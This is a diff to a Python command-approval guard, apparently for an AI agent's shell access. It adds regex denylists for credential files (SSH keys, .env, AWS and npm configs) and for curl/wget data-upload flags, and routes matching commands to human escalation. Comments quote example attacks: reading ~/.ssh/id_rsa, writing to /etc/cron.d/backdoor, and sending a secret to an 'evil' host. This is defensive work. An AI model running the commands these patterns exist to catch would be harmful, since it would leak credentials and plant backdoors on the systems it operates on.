@@ -27,7 +27,7 @@ class DryRunResult:
     decision: str  # "approve" or "escalate"
     rule_index: int  # -1 when no user rule matched
     rule_pattern: str  # regex that matched, or "" if none
-    source: str  # "always_escalate", "safe_builtin", "rule", "default_escalate"
+    source: str  # "always_escalate", "unsafe_command", "safe_builtin", "rule", "default_escalate"
 
 
 class Decision(Enum):
@@ -179,6 +179,59 @@ def _has_substitution(cmd: str) -> bool:
 _RE_ABS_REDIRECT = re.compile(r">>?\s*(?:~|/)")
 
 
+# #1590: paths whose CONTENTS are a credential. `SAFE_SHELL_CMDS` judges the VERB —
+# `cat` is read-only, and reading `~/.ssh/id_rsa` is read-only too, and is exactly how a
+# key leaves the machine. This judges the OBJECT instead.
+#
+# THIS DENYLIST CAN NEVER BE COMPLETE, and nothing should be built on the assumption that
+# it is. It names the secrets one person thought of; `~/.docker/config.json`, `.pgpass`, a
+# token in a file called `notes.txt`, or a read via `python -c` all pass it untouched. It
+# RAISES THE COST OF THE OBVIOUS CASES — it is not a boundary. The real control is the
+# pipeline's fail-safe default (no match → escalate) plus the operator keeping the pilot
+# off. A denylist presented as a boundary is the "looks operational, is inert" shape this
+# codebase has now hit five times; do not let it become the sixth.
+#
+# The dot before `env`/`key` is required so `docs/environment.md` and `src/api-key.ts`
+# stay approvable — a guard that fires on ordinary reads gets switched off within a day.
+_RE_SENSITIVE_PATH = re.compile(
+    r"~?/?\.ssh/"
+    r"|\bid_rsa|\bid_ed25519|\bid_ecdsa"
+    r"|\.pem\b|\.key\b|\.p12\b|\.pfx\b"
+    r"|\.env(\.[A-Za-z0-9_-]+)?(?=$|[\s'\"/;|&)])"
+    r"|\.npmrc\b|\.pypirc\b|\.netrc\b|\.pgpass\b"
+    r"|~?/\.aws/|~?/\.config/gh/|~?/\.docker/config\.json"
+    r"|credentials\b",
+    re.IGNORECASE,
+)
+
+# Flags that make an HTTP client SEND something. Refusing on the payload rather than on
+# the method is deliberate — see :func:`sends_data_outbound`.
+_RE_OUTBOUND_DATA = re.compile(
+    r"\b(curl|wget|http|httpie)\b[^\n]*"
+    r"(\s-d\b|\s--data(-binary|-raw|-urlencode)?\b|\s-F\b|\s--form\b"
+    r"|\s-T\b|\s--upload-file\b|\s-X\s*(POST|PUT|PATCH|DELETE)\b)",
+    re.IGNORECASE,
+)
+
+
+def reads_sensitive_path(cmd: str) -> bool:
+    """True when *cmd* touches a path whose contents are a credential."""
+    return bool(_RE_SENSITIVE_PATH.search(cmd))
+
+
+def sends_data_outbound(cmd: str) -> bool:
+    """True when *cmd* uses an HTTP client to SEND a payload.
+
+    REFUSES ON THE PAYLOAD, NOT THE METHOD, and the choice matters. A "GET/HEAD only"
+    rule would reject `curl -X GET` (explicit and harmless) while still approving
+    `curl https://evil/?secret=…`, because the method is a weaker signal than the
+    presence of a body. Targeting `-d`/`--data`/`-F`/`-T`/`--upload-file` and the
+    mutating methods hits the exfiltration channel directly and leaves the
+    overwhelmingly common `curl <url>` working — which is what keeps this switched on.
+    """
+    return bool(_RE_OUTBOUND_DATA.search(cmd))
+
+
 def writes_outside_worktree(cmd: str) -> bool:
     """True when *cmd* redirects output to an absolute path.
 
@@ -235,9 +288,15 @@ def _segment_approver(safe: re.Pattern[str], config: DroneConfig) -> Callable[[s
         probe = f"Bash({segment})"
         if ALWAYS_ESCALATE.search(probe):
             return False
-        if writes_outside_worktree(segment):
-            # Judged on EFFECT, not verb. `echo x > /etc/cron.d/backdoor` is read-only
-            # by verb, which is exactly why the safe list approved it.
+        if (
+            writes_outside_worktree(segment)
+            or reads_sensitive_path(segment)
+            or sends_data_outbound(segment)
+        ):
+            # Judged on EFFECT, not verb. `echo x > /etc/cron.d/backdoor` and
+            # `cat ~/.ssh/id_rsa` are both read-only by verb, which is exactly why the
+            # safe list approved them. Applied per SEGMENT so `cat ~/.ssh/id_rsa && ls`
+            # is refused by the same code as the bare read.
             return False
         if safe.search(probe):
             return True
@@ -279,6 +338,13 @@ def unsafe_command_verdict(
     # standalone because `echo` is a read-only verb.
     if writes_outside_worktree(cmd):
         return True, "redirects output outside the worktree"
+    # #1590: effect, not verb. Both apply to SINGLE commands as well as chains — a bare
+    # `cat ~/.ssh/id_rsa` needs no chaining to leak a key, and the safe list approved it
+    # standalone because `cat` is a read-only verb.
+    if reads_sensitive_path(cmd):
+        return True, "reads a path whose contents are a credential"
+    if sends_data_outbound(cmd):
+        return True, "sends a payload to a remote host"
     if not is_compound_command(cmd):
         return False, ""
     if _has_substitution(cmd):
@@ -818,7 +884,7 @@ def dry_run_rules(
                 decision="escalate",
                 rule_index=-1,
                 rule_pattern=reason,
-                source="compound_command",
+                source="unsafe_command",
             )
         ]
 
